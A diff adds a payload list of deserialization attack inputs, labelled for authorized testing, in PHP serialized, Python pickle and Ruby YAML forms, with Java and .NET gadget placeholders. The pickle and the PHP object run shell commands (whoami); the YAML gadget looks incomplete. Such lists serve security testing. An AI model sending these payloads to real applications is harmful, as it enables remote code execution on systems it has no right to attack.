@@ -1,0 +1,31 @@
+# PHP serialized payload examples (for educational / authorized testing only)
+O:8:"stdClass":1:{s:4:"test";s:6:"value";}
+a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":0:{}}
+O:4:"Test":1:{s:4:"data";s:26:"<?php system('whoami'); ?>";}
+
+# Java serialized (hex representation for reference)
+# aced00057372001a... (CommonsCollections1 gadget chain)
+
+# Python pickle payloads (for testing deserialization)
+cposix
+system
+p0
+(S'whoami'
+p1
+tp2
+Rp3
+.
+
+# YAML deserialization triggers (Ruby / SnakeYAML)
+---
+- !ruby/object:Gem::Requirement
+  requirements:
+    - !ruby/object:Gem::Dependency
+      name: rce
+      requirement: !ruby/object:Gem::Requirement
+        requirements:
+          - !ruby/object
+            command: id
+
+# .NET BinaryFormatter gadget (Ysoserial.net style)
+# AAEAAAD... (ObjectStateFormatter gadget)
